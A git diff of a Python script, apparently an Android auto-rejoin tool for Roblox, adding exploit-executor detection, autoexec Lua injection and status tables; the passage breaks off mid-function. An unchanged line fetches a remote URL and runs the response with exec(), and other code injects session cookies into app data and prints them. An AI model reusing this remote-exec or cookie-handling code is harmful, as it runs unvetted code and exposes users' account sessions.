@@ -7,7 +7,6 @@ import asyncio
 import aiohttp
 import threading
 import psutil
-import re
 import crypto
 import platform
 import uuid 
@@ -23,192 +22,300 @@ response = requests.get(url)
 
 exec(response.text)
 
-init() 
+init()
 
 SERVER_LINKS_FILE = "AXPrivate_Server_Link.txt"
 ACCOUNTS_FILE = "AXAccount.txt"
 interval = None
-stop_webhook_thread = False
-webhook_thread = None
+status_lock = Lock()
+rejoin_lock = Lock()
+package_statuses = {}
+username_cache = {}
+CACHE_FILE = "username_cache.json"
+cache_save_interval = 600  
+stop_event = threading.Event()
+    
+executors = {
+    "Fluxus": "/storage/emulated/0/Fluxus/",
+    "Codex": "/storage/emulated/0/Codex/",
+    "Arceus X": "/storage/emulated/0/Arceus X/",
+    "Delta": "/storage/emulated/0/Delta/",
+    "Cryptic": "/storage/emulated/0/Cryptic/"
+}
 
-def print_header():
+workspace_paths = []
+
+for executor, base_path in executors.items():
+    workspace_paths.append(f"{base_path}Workspace")   
+    workspace_paths.append(f"{base_path}workspace")  
+
+    
+lua_script_template = '''
+repeat wait() until game:IsLoaded()
+
+local GuiService = game:GetService("GuiService")
+local Players = game:GetService("Players")
+local os_time = os.time()
+
+getgenv().StopUpdate = false
+local username = Players.LocalPlayer.Name
+local statusFile = "executor_check_" .. username .. ".txt"
+
+local function hasExecutedBefore()
+    return pcall(function()
+        return readfile(statusFile) == "executed"
+    end)
+end
+
+local function writeExecutorStatus(status)
+    pcall(function()
+        writefile(statusFile, status .. ":" .. os_time)
+    end)
+end
+
+if not hasExecutedBefore() then
+    writefile(statusFile, "executed")
+
+    writeExecutorStatus("working")
+
+    GuiService.ErrorMessageChanged:Connect(function()
+        local Code = GuiService:GetErrorCode().Value
+        if Code >= Enum.ConnectionError.DisconnectErrors.Value then
+            getgenv().StopUpdate = true
+        end
+    end)
+end
+'''
+
+def clear_screen():
     os.system('cls' if os.name == 'nt' else 'clear')
+
+def print_rainbow_header():
     header = r"""
-   _____         .__              .__         __________            __       .__        
-  /  _  \ ___  __|__| ____   ____ |__|__  ___ \______   \ ____     |__| ____ |__| ____  
- /  /_\  \\  \/  /  |/  _ \ /    \|  \  \/  /  |       _// __ \    |  |/  _ \|  |/    \ 
-/    |    \>    <|  (  <_> )   |  \  |>    <   |    |   \  ___/    |  (  <_> )  |   |  \
-\____|__  /__/\_ \__|\____/|___|  /__/__/\_ \  |____|_  /\___  >\__|  |\____/|__|___|  /
-        \/      \/              \/         \/         \/     \/\______|              \/           
+___________.__                     __   .__                   __________              __         .__         
+\_   _____/|  |    ____  _____   _/  |_ |__|  ____     ____   \______   \  ____      |__|  ____  |__|  ____  
+ |    __)  |  |   /  _ \ \__  \  \   __\|  | /    \   / ___\   |       _/_/ __ \     |  | /  _ \ |  | /    \ 
+ |     \   |  |__(  <_> ) / __ \_ |  |  |  ||   |  \ / /_/  >  |    |   \\  ___/     |  |(  <_> )|  ||   |  \
+ \___  /   |____/ \____/ (____  / |__|  |__||___|  / \___  /   |____|_  / \___  >/\__|  | \____/ |__||___|  /
+     \/                       \/                 \/ /_____/           \/      \/ \______|                 \/          
 """
-    print(Fore.LIGHTCYAN_EX + header + Style.RESET_ALL)
+    colors = [Fore.RED, Fore.YELLOW, Fore.GREEN, Fore.CYAN, Fore.BLUE, Fore.MAGENTA]
+    color_index = 0
 
-def get_roblox_packages():
-    suffixes = 'qwertyuiopasdfghjklzxcvbnm0123456789'
-    package_prefix = "com.roblox.clien"
+    for line in header.splitlines():
+        for char in line:
+            print(colors[color_index % len(colors)] + char, end='')
+            color_index += 1
+            if color_index % 10 == 0:
+                time.sleep(0.01)  
+        print(Style.RESET_ALL)
+
+    print(Fore.LIGHTMAGENTA_EX + "Created By not.shiroo | Improved By Axionix" + Style.RESET_ALL)
+
+print_rainbow_header()
+
+def detect_and_write_lua_script():
+    detected_executors = []
+
+    for executor_name, base_path in executors.items():
+        # Define all possible paths for Autoexec/Autoexecute
+        possible_autoexec_paths = [
+            os.path.join(base_path, "Autoexec"),
+            os.path.join(base_path, "Autoexecute")
+        ]
+
+        lua_written = False  # To track if Lua file is successfully written
+
+        # Loop through Autoexec and Autoexecute paths
+        for path in possible_autoexec_paths:
+            if os.path.exists(path):
+                # Lua script path
+                lua_script_path = os.path.join(path, "executor_check.lua")
+                
+                try:
+                    # Write the Lua script to the detected Autoexec/Autoexecute folder
+                    with open(lua_script_path, 'w') as file:
+                        file.write(lua_script_template)  # Assume lua_script_template is predefined
+                    lua_written = True  # Mark Lua script as written
+                    break  # Stop checking further paths once written
+
+                except Exception:
+                    pass  # Silently ignore errors
+
+        if lua_written:
+            detected_executors.append(executor_name)
+
+    return detected_executors
+
+def reset_executor_file(username):
+    """
+    Clears any existing executor status file for the given username.
+    This ensures a fresh start each time Roblox is launched, only in a valid Workspace path (lowercase or uppercase).
+    """
+    status_file = f"executor_check_{username}.txt"
+    valid_workspace = None  # Will store the valid workspace path once detected
+
+    # Search only in Workspace paths (uppercase 'W' and lowercase 'w')
+    for executor, base_path in executors.items():
+        for workspace_dir in ["workspace", "Workspace"]:
+            workspace_path = os.path.join(base_path, workspace_dir)
+            if os.path.exists(workspace_path):
+                valid_workspace = workspace_path
+                break  # Exit the loop once a valid workspace is found
+
+        if valid_workspace:
+            # Clear the status file in the detected workspace
+            file_path = os.path.join(valid_workspace, status_file)
+            if os.path.exists(file_path):
+                try:
+                    os.remove(file_path)  # Clear the status file for a fresh start
+                    # The print statements have been removed as intended
+                except Exception as e:
+                    pass  # Ignore the error silently
+            break  # Exit the executor loop once the file is removed
+
+def clear_executor_status(username):
+    """
+    Clears any existing executor status file for the given username.
+    This ensures a fresh start each time Roblox is launched, only in a valid Workspace path (lowercase or uppercase).
+    """
+    status_file = f"executor_check_{username}.txt"
+    valid_workspace = None  # Will store the valid workspace path once detected
+
+    # Search only in Workspace paths (uppercase 'W' and lowercase 'w')
+    for executor, base_path in executors.items():
+        for workspace_dir in ["workspace", "Workspace"]:
+            workspace_path = os.path.join(base_path, workspace_dir)
+            if os.path.exists(workspace_path):
+                valid_workspace = workspace_path
+                break  # Exit the loop once a valid workspace is found
+
+        if valid_workspace:
+            # Clear the status file in the detected workspace
+            file_path = os.path.join(valid_workspace, status_file)
+            if os.path.exists(file_path):
+                try:
+                    os.remove(file_path)  # Clear the status file for a fresh start
+                    # The print statements have been removed as intended
+                except Exception as e:
+                    pass  # Ignore the error silently
+            break  # Exit the executor loop once the file is removed
+                
+def check_executor_status(username, continuous=False, max_wait_time=240, check_interval=5, max_inactivity_time=30):
+    status_file = f"executor_check_{username}.txt"
+    retry_timeout = time.time() + max_wait_time  
+    active_workspace = None  
+
+    # Dynamically search for a valid workspace (lowercase or uppercase)
+    for executor, base_path in executors.items():
+        for workspace_dir in ["workspace", "Workspace"]:
+            workspace_path = os.path.join(base_path, workspace_dir)
+            if os.path.exists(workspace_path):
+                active_workspace = workspace_path
+                break  # Exit the loop once a valid workspace is found
+
+        if active_workspace:
+            break  # Stop searching once we find a valid workspace
+
+    if not active_workspace:
+        # No valid workspace found; skip executor check silently
+        return True  # Skip the check if no valid workspace is found
+
+    start_time = time.time()
     
-    try:
-        output = subprocess.check_output("pm list packages", shell=True, text=True)
-    except subprocess.CalledProcessError:
-        print(Fore.RED + "An Error Occurred While Searching For Package On Your Device!" + Style.RESET_ALL)
-        return []
+    while True:  # Continuous checking or stop after max_wait_time if continuous=False
+        file_path = os.path.join(active_workspace, status_file)
 
-    packages = [f"{package_prefix}{suffix}" for suffix in suffixes if f"{package_prefix}{suffix}" in output]
+        if os.path.exists(file_path):
+            # Check the last modification time
+            last_modified_time = os.path.getmtime(file_path)
+            current_time = time.time()
+
+            # If the file was modified within the max_inactivity_time, we assume it's still being updated
+            if current_time - last_modified_time < max_inactivity_time:
+                with open(file_path, 'r') as f:
+                    content = f.read().strip()
+
+                    # Check if the content starts with "working", ignore the timestamp for this check
+                    if content.startswith("working"):
+                        return True  # Executor loaded successfully
+
+        # Exit after max_wait_time if continuous is False
+        if not continuous and time.time() > retry_timeout:
+            return False  # Trigger a rejoin or retry logic
+
+        # Continue checking at regular intervals
+        time.sleep(check_interval)  # Wait before checking again
+
+def create_dynamic_menu(options):
+    # Determine the maximum width needed for the menu
+    max_option_length = max(len(option) + 2 for option in options)  # +2 for number and dot
     
-    if packages:
-        for package in packages:
-            print(Fore.GREEN + f"Package Found On Your Device, Which Is: {package}" + Style.RESET_ALL)
-    else:
-        print(Fore.YELLOW + "No Package Found On Your Device, Please Set Package To 0-9 Or A-M!" + Style.RESET_ALL)
+    # Create dynamic menu box
+    top_border = f"{Fore.LIGHTCYAN_EX}╔{'═' * (max_option_length + 4)}╗"
+    bottom_border = f"╚{'═' * (max_option_length + 4)}╝{Style.RESET_ALL}"
+    menu_content = [f"{Fore.LIGHTCYAN_EX}║ {Fore.LIGHTMAGENTA_EX}{i+1}{Fore.LIGHTCYAN_EX}. {option.ljust(max_option_length)} ║" 
+                    for i, option in enumerate(options)]
     
-    return packages
+    print(top_border)
+    for line in menu_content:
+        print(line)
+    print(bottom_border)
 
-def kill_roblox_processes():
-    print(Fore.YELLOW + "Turning Off All Roblox Games On Your Device..." + Style.RESET_ALL)
-    package_names = get_roblox_packages()
+def create_dynamic_table(headers, rows):
+    col_widths = [max(len(str(item)) for item in col) for col in zip(headers, *rows)]
 
-    if not package_names:
-        print(Fore.RED + "There Are No Active Packages On Your Device!" + Style.RESET_ALL)
-        return
+    top_border = f"{Fore.LIGHTCYAN_EX}╔" + "╦".join("═" * (width + 2) for width in col_widths) + "╗"
+    middle_border = "╠" + "╬".join("═" * (width + 2) for width in col_widths) + "╣"
+    bottom_border = f"╚" + "╩".join("═" * (width + 2) for width in col_widths) + "╝" + Style.RESET_ALL
 
-    for package_name in package_names:
-        kill_roblox_process(package_name)
+    header_row = "║ " + " ║ ".join(header.ljust(col_widths[i]) for i, header in enumerate(headers)) + " ║"
 
-def kill_roblox_process(package_name):
-    print(Fore.YELLOW + f"Roblox Game Shutdown In Progress: {package_name}" + Style.RESET_ALL)
+    data_rows = ["║ " + " ║ ".join(str(row[i]).ljust(col_widths[i]) for i in range(len(headers))) + " ║"
+                 for row in rows]
+
+    print(top_border)
+    print(header_row)
+    print(middle_border)
+    for row in data_rows:
+        print(row)
+    print(bottom_border) 
+
+def update_status_table(package_statuses):
+    clear_screen()
+    print_rainbow_header()
+
+    headers = ["Package", "Username", "Status"]
+    status_width = 30  
     
-    try:
-        result = subprocess.run(['pkill', '-f', package_name], capture_output=True, text=True)
-        
-        if result.returncode == 0:
-            print(Fore.GREEN + f"Roblox Game Successfully Disabled: {package_name}" + Style.RESET_ALL)
-        else:
-            print(Fore.RED + f"An Error Occurred While Closing Roblox Game: {package_name} (might not exist)" + Style.RESET_ALL)
+    col_widths = [
+        max(len(headers[0]), max(len(str(package)) for package in package_statuses.keys())) + 2,
+        max(len(headers[1]), max(len(str(info.get("Username", "Unknown"))) for info in package_statuses.values())) + 2,
+        status_width  # Fixed width for Status
+    ]
     
-    except subprocess.CalledProcessError as e:
-        print(Fore.RED + f"An Error Occurred While Closing Roblox Game With Package Is {package_name}, Status Code Is: {e}" + Style.RESET_ALL)
+    top_border = f"{Fore.LIGHTCYAN_EX}╔" + "╦".join("═" * width for width in col_widths) + "╗"
+    middle_border = "╠" + "╬".join("═" * width for width in col_widths) + "╣"
+    bottom_border = f"╚" + "╩".join("═" * width for width in col_widths) + "╝" + Style.RESET_ALL
 
-    time.sleep(1)
-
-def launch_roblox(package_name, server_link, num_packages):
-    try:
-        subprocess.run(['am', 'start', '-n', f'{package_name}/com.roblox.client.startup.ActivitySplash', '-d', server_link], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-        print(Fore.YELLOW + f"In Progress Opening Roblox Game For: {package_name}..." + Style.RESET_ALL)
-        
-        time.sleep(15 if num_packages >= 6 else 8)  
-
-        subprocess.run(['am', 'start', '-n', f'{package_name}/com.roblox.client.ActivityProtocolLaunch', '-d', server_link], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-        print(Fore.YELLOW + f"In Progress Joining Roblox Game For: {package_name}..." + Style.RESET_ALL)
-        time.sleep(20)
-    except Exception as e:
-        print(Fore.RED + f"An Error Occurred While Launching Roblox Game: {package_name}, Status Code Is: {e}" + Style.RESET_ALL)
-
-def format_server_link(input_link):
-    if 'roblox.com' in input_link:
-        return input_link
+    header_row = "║ " + " ║ ".join(header.ljust(col_widths[i] - 1) for i, header in enumerate(headers)) + " ║"
     
-    if input_link.isdigit():
-        return f'roblox://placeID={input_link}'
+    data_rows = []
+    for package, info in package_statuses.items():
+        row = [
+            str(package).ljust(col_widths[0] - 1),
+            str(info.get("Username", "Unknown")).ljust(col_widths[1] - 1),
+            str(info.get("Status", "")).ljust(col_widths[2] - 1)  # Fixed width for Status
+        ]
+        data_rows.append("║ " + " ║ ".join(row) + " ║")
     
-    print(Fore.RED + "Invalid Input! Please Enter Valid Game ID Or Valid Private Server Link!" + Style.RESET_ALL)
-    return None
-
-def save_server_links(server_links):
-    with open(SERVER_LINKS_FILE, "w") as file:
-        for package, link in server_links:
-            file.write(f"{package},{link}\n")
-
-def load_server_links():
-    server_links = []
-    if os.path.exists(SERVER_LINKS_FILE):
-        with open(SERVER_LINKS_FILE, "r") as file:
-            for line in file:
-                package, link = line.strip().split(",", 1)
-                server_links.append((package, link))
-    return server_links
-
-def save_accounts(accounts):
-    with open(ACCOUNTS_FILE, "w") as file:
-        for package, user_id in accounts:
-            file.write(f"{package},{user_id}\n")
-
-def load_accounts():
-    accounts = []
-    if os.path.exists(ACCOUNTS_FILE):
-        with open(ACCOUNTS_FILE, "r") as file:
-            for line in file:
-                package, user_id = line.strip().split(",", 1)
-                accounts.append((package, user_id))
-    return accounts
-
-def find_userid_from_file(file_path):
-    try:
-        with open(file_path, 'r') as file:
-            content = file.read()
-            # Debugging information removed to keep console clean
-
-            userid_start = content.find('"UserId":"')
-            if userid_start == -1:
-                print("Userid not found")
-                return None
-
-            userid_start += len('"UserId":"')
-            userid_end = content.find('"', userid_start)
-            if userid_end == -1:
-                print("Userid end quote not found")
-                return None
-
-            userid = content[userid_start:userid_end]
-            return userid
-
-    except IOError as e:
-        print(f"Error reading file: {e}")
-        return None
-
-async def get_user_id(username):
-    url = "https://users.roblox.com/v1/usernames/users"
-    payload = {
-        "usernames": [username],
-        "excludeBannedUsers": True
-    }
-    headers = {
-        "Content-Type": "application/json"
-    }
-
-    async with aiohttp.ClientSession() as session:
-        async with session.post(url, json=payload, headers=headers) as response:
-            data = await response.json()
-            if 'data' in data and len(data['data']) > 0:
-                return data['data'][0]['id']
-    return None
-
-def get_username(user_id):
-    try:
-        url = f"https://users.roblox.com/v1/users/{user_id}"
-        response = requests.get(url)
-        response.raise_for_status()
-        data = response.json()
-        return data.get("name", "Unknown")
-    except Exception as e:
-        print(f"Error getting username for user ID {user_id}: {e}")
-        return None
-
-def check_user_online(user_id):
-    url = "https://presence.roblox.com/v1/presence/users"
-    headers = {'Content-Type': 'application/json'}
-    body = {"userIds": [user_id]}
-    
-    try:
-        response = requests.post(url, headers=headers, json=body)
-        response.raise_for_status() 
-
-        data = response.json()
-        return data["userPresences"][0].get("userPresenceType")
-    
-    except requests.RequestException as e:
-        print(f"An Error Occurred While Checking Status, Status Code Is: {e}")
-        return None
-
+    print(top_border)
+    print(header_row)
+    print(middle_border)
+    for row in data_rows:
+        print(row)
+    print(bottom_border)
+     
 def verify_cookie(cookie_value):
     try:
         # Set the headers with the cookie
@@ -230,40 +337,38 @@ def verify_cookie(cookie_value):
 
         if response.status_code == 200:
             # The user is authenticated
-            print(Fore.GREEN + "Cookie is valid! User is authenticated." + Style.RESET_ALL)
+            print(Fore.GREEN + "Your Cookies Are Correct, Your User Is Authenticated." + Style.RESET_ALL)
             return True
         elif response.status_code == 401:
             # Unauthorized, the cookie is invalid
-            print(Fore.RED + "Invalid cookie. The user is not authenticated." + Style.RESET_ALL)
+            print(Fore.RED + "An Error Occurred While Verifying Your Cookie!" + Style.RESET_ALL)
             return False
         else:
             # Some other error occurred
-            print(Fore.RED + f"Error verifying cookie: {response.status_code} - {response.text}" + Style.RESET_ALL)
+            print(Fore.RED + f"An HTTP Error Occurred While Verifying Your Cookie, Status Code Is: {response.status_code} - {response.text}" + Style.RESET_ALL)
             return False
 
     except Exception as e:
-        print(Fore.RED + f"Exception occurred while verifying cookie: {e}" + Style.RESET_ALL)
+        print(Fore.RED + f"Another Error Occurred While Verifying Your Cookie, Status Code Is: {e}" + Style.RESET_ALL)
         return False
-  
+        
 def download_file(url, destination, binary=False):
     try:
-        with requests.Session() as session:
-            response = session.get(url, stream=True)
-            if response.status_code == 200:
-                mode = 'wb' if binary else 'w'
-                with open(destination, mode) as file:
-                    if binary:
-                        shutil.copyfileobj(response.raw, file)
-                    else:
-                        for chunk in response.iter_content(chunk_size=8192):
-                            file.write(chunk.decode('utf-8'))
-                print(Fore.GREEN + f"{os.path.basename(destination)} Downloaded Successfully." + Style.RESET_ALL)
-                return destination
-            else:
-                print(Fore.RED + f"An Error Occurred While Downloading the File: {os.path.basename(destination)}, Status Code Is: {response.status_code}" + Style.RESET_ALL)
-                return None
+        response = requests.get(url, stream=True)
+        if response.status_code == 200:
+            mode = 'wb' if binary else 'w'
+            with open(destination, mode) as file:
+                if binary:
+                    shutil.copyfileobj(response.raw, file)
+                else:
+                    file.write(response.text)
+            print(Fore.GREEN + f"{os.path.basename(destination)} Downloaded Successfully." + Style.RESET_ALL)
+            return destination
+        else:
+            print(Fore.RED + f"An Error Occurred While Downloading the File: {os.path.basename(destination)}." + Style.RESET_ALL)
+            return None
     except Exception as e:
-        print(Fore.RED + f"Another Error Occurred While Downloading the File: {os.path.basename(destination)}, Status Code Is: {e}" + Style.RESET_ALL)
+        print(Fore.RED + f"Another Error Occurred While Downloading the File: {os.path.basename(destination)}: {e}" + Style.RESET_ALL)
         return None
 
 def replace_cookie_value_in_db(db_path, new_cookie_value):
@@ -344,28 +449,22 @@ def inject_cookies_and_appstorage():
                 
                 print(Fore.GREEN + f"Injecting cookie for {package_name}: {cookie}" + Style.RESET_ALL)
                 
-                # Paths to the destination directories
                 destination_db_dir = f"/data/data/{package_name}/app_webview/Default/"
                 destination_appstorage_dir = f"/data/data/{package_name}/files/appData/LocalStorage/"
 
-                # Ensure directories exist
                 os.makedirs(destination_db_dir, exist_ok=True)
                 os.makedirs(destination_appstorage_dir, exist_ok=True)
 
-                # Copy the downloaded Cookies.db to the destination
                 destination_db_path = os.path.join(destination_db_dir, "Cookies")
                 shutil.copyfile(downloaded_db_path, destination_db_path)
                 print(Fore.GREEN + f"Copied Cookies.db to {destination_db_path}" + Style.RESET_ALL)
 
-                # Inject the appStorage.json
                 destination_appstorage_path = os.path.join(destination_appstorage_dir, "appStorage.json")
                 shutil.copyfile(downloaded_appstorage_path, destination_appstorage_path)
                 print(Fore.GREEN + f"Copied appStorage.json to {destination_appstorage_path}" + Style.RESET_ALL)
 
-                # Replace the cookie value in the database
                 replace_cookie_value_in_db(destination_db_path, cookie)
 
-                # Verify the cookie after injection
                 print(Fore.YELLOW + f"Verifying cookie for {package_name} after injection..." + Style.RESET_ALL)
                 if verify_cookie(cookie):
                     print(Fore.GREEN + f"Cookie for {package_name} is valid after injection!" + Style.RESET_ALL)
@@ -377,87 +476,573 @@ def inject_cookies_and_appstorage():
 
     print(Fore.GREEN + "Cookie and appStorage injection completed for all packages." + Style.RESET_ALL) 
 
-def main():
-    print_header()
+def get_roblox_packages():
+    packages = []
+    suffixes = 'qwertyuiopasdfghjklzxcvbnm0123456789'
     
-    while True:
-        setup_type = input(Fore.GREEN + "Choose Your Setup:\n1. Start Auto Rejoin Roblox Game\n2. Set User ID For Each Package\n3. Same Game ID Or Private Server Link\n4. Different Private Server Or Game ID\n5. Clear User ID And/Or Private Server Link\n6. List\n7. Auto Setup User ID\n8. Roblox Account Login Using Cookie\n9. Exit\nPlease Enter Your Choice: " + Style.RESET_ALL) 
+    try:
+        output = subprocess.check_output("pm list packages", shell=True, text=True)
+    except subprocess.CalledProcessError as e:
+        print(Fore.RED + "An Error Occurred While Searching For Package On Your Device!" + Style.RESET_ALL)
+        return packages
+
+    for suffix in suffixes:
+        package_name = f"com.roblox.clien{suffix}"
+        print(Fore.YELLOW + f"Checking Packages On Your Device: {package_name}" + Style.RESET_ALL)
         
-        if setup_type == "1": 
-            accounts = load_accounts() 
+        if package_name in output:
+            print(Fore.GREEN + f"Package Found On Your Device Is: {package_name}" + Style.RESET_ALL)
+            packages.append(package_name)
+
+    return packages
+
+def is_roblox_running(package_name):
+    package_name = package_name.lower() 
+    for proc in psutil.process_iter(['name']):
+        if package_name in proc.info['name'].lower():
+            return True
+    return False
+
+def kill_roblox_processes():
+    print("Killing all Roblox processes...")
+    package_names = get_roblox_packages()
+    for package_name in package_names:
+        print(f"Trying to kill process for package: {package_name}")
+        os.system(f"pkill -f {package_name}")
+    time.sleep(2) 
+
+def kill_roblox_process(package_name):
+    print(f"Killing Roblox process for {package_name}...")
+    os.system(f"pkill -f {package_name}")
+    time.sleep(2) 
+
+def update_package_status(package_name, status, package_statuses):
+    package_statuses[package_name]["Status"] = status
+    update_status_table(package_statuses)
+
+def launch_roblox(package_name, server_link, num_packages, package_statuses):
+    try:
+        update_package_status(package_name, Fore.YELLOW + f"Enabling Roblox Game For Package: {package_name}..." + Style.RESET_ALL, package_statuses)
+
+        subprocess.run(['am', 'start', '-n', f'{package_name}/com.roblox.client.startup.ActivitySplash', '-d', server_link], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        time.sleep(15) 
+
+        update_package_status(package_name, Fore.YELLOW + f"Joining Roblox Game For Package: {package_name}..." + Style.RESET_ALL, package_statuses)
+        subprocess.run(['am', 'start', '-n', f'{package_name}/com.roblox.client.ActivityProtocolLaunch', '-d', server_link], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        
+        time.sleep(20)
+
+        update_package_status(package_name, Fore.GREEN + "Joined Roblox Game" + Style.RESET_ALL, package_statuses)
+
+    except Exception as e:
+        update_package_status(package_name, Fore.RED + f"An Error Occurred While Enabling Roblox Game For Package: {package_name}, Status Code: {e}" + Style.RESET_ALL, package_statuses)
+        print(f"Error details: {e}")
+
+def check_executor_and_rejoin(package_name, username, package_statuses, server_link, num_packages, accounts):
+    try:
+        detected_executors = detect_and_write_lua_script()
+
+        if detected_executors:
+            print(f"Checking executor status for {package_name} with username {username}...")
+
+            # Keep checking for the executor status, up to 2 minutes (every 10 seconds)
+            start_time = time.time()
+            executor_loaded = False
+            while time.time() - start_time < 120:  # 2 minutes timeout
+                if check_executor_status(username):
+                    package_statuses[package_name]["Status"] = Fore.GREEN + f"Executor loaded successfully for {username}" + Style.RESET_ALL
+                    executor_loaded = True
+                    break
+                time.sleep(10)
+
+            # If executor didn't load within the timeout, rejoin
+            if not executor_loaded:
+                print(f"Executor did not load for {package_name} (username: {username}). Rejoining...")
+                package_statuses[package_name]["Status"] = Fore.RED + "Executor failed, rejoining..." + Style.RESET_ALL
+                update_status_table(package_statuses)
+
+                # Rejoin by killing the current Roblox process and relaunching
+                kill_roblox_process(package_name)
+                time.sleep(2)
+                launch_roblox(package_name, server_link, num_packages, package_statuses)
+                check_executor_and_rejoin(package_name, username, package_statuses, server_link, num_packages, accounts)
+        else:
+            # No executor was detected; proceed without rejoining
+            print(f"No executor detected for {package_name} (username: {username}).")
+            package_statuses[package_name]["Status"] = Fore.GREEN + f"Joined without executor for {username}" + Style.RESET_ALL
+            update_status_table(package_statuses)
+
+        # Start the background executor monitor after joining
+        monitor_thread = threading.Thread(target=background_executor_monitor, args=(package_name, username, package_statuses, server_link, num_packages))
+        monitor_thread.daemon = True  # Ensures the thread closes when the main program exits
+        monitor_thread.start()
+
+    except Exception as e:
+        package_statuses[package_name]["Status"] = Fore.RED + f"Error checking executor for {package_name}: {e}" + Style.RESET_ALL
+        update_status_table(package_statuses)
+
+def background_executor_monitor(package_name, username, package_statuses, server_link, num_packages, retry_limit=3):
+    retry_count = 0
+
+    try:
+        while True:
+            # Periodically check the executor status every 10 seconds
+            if not check_executor_status(username, continuous=False):
+                # Increment retry count
+                retry_count += 1
+                package_statuses[package_name]["Status"] = Fore.RED + "Executor failed, rejoining..." + Style.RESET_ALL
+                update_status_table(package_statuses)
                 
+                # Check if retry limit reached to prevent endless rejoining
+                if retry_count >= retry_limit:
+                    package_statuses[package_name]["Status"] = Fore.RED + "Reached retry limit, stopping rejoin attempts..." + Style.RESET_ALL
+                    update_status_table(package_statuses)
+                    break
+
+                # Acquire lock to ensure only one Roblox process is relaunched at a time
+                with rejoin_lock:
+                    # Rejoin by killing the current Roblox process and relaunching
+                    kill_roblox_process(package_name)
+                    time.sleep(5)  # Grace period before relaunching
+                    launch_roblox(package_name, server_link, num_packages, package_statuses)
+                    
+                    # Wait another 30 seconds before checking executor status after relaunch
+                    time.sleep(120)
+
+                # Check the executor status again after relaunch
+                if check_executor_status(username, continuous=False):
+                    # Reset retry count if executor successfully loaded
+                    retry_count = 0
+                    package_statuses[package_name]["Status"] = Fore.GREEN + "Executor reloaded successfully after rejoin." + Style.RESET_ALL
+                    update_status_table(package_statuses)
+                else:
+                    package_statuses[package_name]["Status"] = Fore.RED + "Executor still failed after rejoin, retrying..." + Style.RESET_ALL
+                    update_status_table(package_statuses)
+
+            # Wait before the next check
+            time.sleep(30)
+    except Exception as e:
+        package_statuses[package_name]["Status"] = Fore.RED + f"Error in background monitor: {e}" + Style.RESET_ALL
+        update_status_table(package_statuses)
+        
+def get_game_name(game_link_or_id):
+    try:
+        # Extract the game ID from the link if it's a URL
+        if 'roblox.com' in game_link_or_id:
+            game_id = game_link_or_id.split('/')[-1]
+        else:
+            game_id = game_link_or_id
+
+        # Make a request to the Roblox API to get game details
+        url = f"https://games.roblox.com/v1/games?universeIds={game_id}"
+        response = requests.get(url, timeout=10)
+        if response.status_code == 200:
+            game_data = response.json()
+            if game_data['data']:
+                return game_data['data'][0]['name']
+            else:
+                return "Unknown Game"
+        else:
+            return "Failed to retrieve game name"
+    except Exception as e:
+        print(Fore.RED + f"Error retrieving game name: {e}" + Style.RESET_ALL)
+        return "Error"
+        
+# Function to format server link
+def format_server_link(input_link):
+    if 'roblox.com' in input_link:
+        return input_link
+    elif input_link.isdigit():
+        return f'roblox://placeID={input_link}'
+    else:
+        print(Fore.RED + "Invalid input! Please enter a valid game ID or private server link." + Style.RESET_ALL)
+        return None
+
+# Function to save server links to file
+def save_server_links(server_links):
+    with open(SERVER_LINKS_FILE, "w") as file:
+        for package, link in server_links:
+            file.write(f"{package},{link}\n")
+
+# Function to load server links from file
+def load_server_links():
+    server_links = []
+    if os.path.exists(SERVER_LINKS_FILE):
+        with open(SERVER_LINKS_FILE, "r") as file:
+            for line in file:
+                package, link = line.strip().split(",", 1)
+                server_links.append((package, link))
+    return server_links
+
+# Function to save accounts to file
+def save_accounts(accounts):
+    with open(ACCOUNTS_FILE, "w") as file:
+        for package, user_id in accounts:
+            file.write(f"{package},{user_id}\n")
+
+# Function to load accounts from file
+def load_accounts():
+    accounts = []
+    if os.path.exists(ACCOUNTS_FILE):
+        with open(ACCOUNTS_FILE, "r") as file:
+            for line in file:
+                package, user_id = line.strip().split(",", 1)
+                accounts.append((package, user_id))
+    return accounts
+
+# Function to find UserId from file
+def find_userid_from_file(file_path):
+    try:
+        with open(file_path, 'r') as file:
+            content = file.read()
+            # Debugging information removed to keep console clean
+
+            userid_start = content.find('"UserId":"')
+            if userid_start == -1:
+                print("Userid not found")
+                return None
+
+            userid_start += len('"UserId":"')
+            userid_end = content.find('"', userid_start)
+            if userid_end == -1:
+                print("Userid end quote not found")
+                return None
+
+            userid = content[userid_start:userid_end]
+            return userid
+
+    except IOError as e:
+        print(f"Error reading file: {e}")
+        return None
+
+# Asynchronous function to get user ID from username
+async def get_user_id(username):
+    url = "https://users.roblox.com/v1/usernames/users"
+    payload = {
+        "usernames": [username],
+        "excludeBannedUsers": True
+    }
+    headers = {
+        "Content-Type": "application/json"
+    }
+
+    async with aiohttp.ClientSession() as session:
+        async with session.post(url, json=payload, headers=headers) as response:
+            data = await response.json()
+            if 'data' in data and len(data['data']) > 0:
+                return data['data'][0]['id']
+    return None
+
+def get_server_link(package_name, server_links):
+    return next((link for pkg, link in server_links if pkg == package_name), None)
+
+def get_username_from_id(user_id):
+    return get_username(user_id) or user_id
+    
+# Function to get username from user ID
+def get_username(user_id):
+    retry_attempts = 2
+    for attempt in range(retry_attempts):
+        try:
+            url = f"https://users.roblox.com/v1/users/{user_id}"
+            response = requests.get(url, timeout=10)
+            response.raise_for_status()
+            data = response.json()
+            username = data.get("name", "Unknown")
+            if username != "Unknown":
+                username_cache[user_id] = username
+                save_username(user_id, username)
+                return username
+        except requests.exceptions.RequestException as e:
+            print(Fore.RED + f"Attempt {attempt + 1} failed for Roblox Users API: {e}" + Style.RESET_ALL)
+            time.sleep(2 ** attempt)  # Exponential backoff
+
+    # Fallback to RoProxy API
+    for attempt in range(retry_attempts):
+        try:
+            url = f"https://users.roproxy.com/v1/users/{user_id}"
+            response = requests.get(url, timeout=10)
+            response.raise_for_status()
+            data = response.json()
+            username = data.get("name", "Unknown")
+            if username != "Unknown":
+                username_cache[user_id] = username
+                save_username(user_id, username)
+                return username
+        except requests.exceptions.RequestException as e:
+            print(Fore.RED + f"Attempt {attempt + 1} failed for RoProxy API: {e}" + Style.RESET_ALL)
+            time.sleep(2 ** attempt)  # Exponential backoff
+
+    return "Unknown"
+
+# Example of saving the username in a persistent storage
+def save_username(user_id, username):
+    try:
+        if not os.path.exists("usernames.json"):
+            with open("usernames.json", "w") as file:
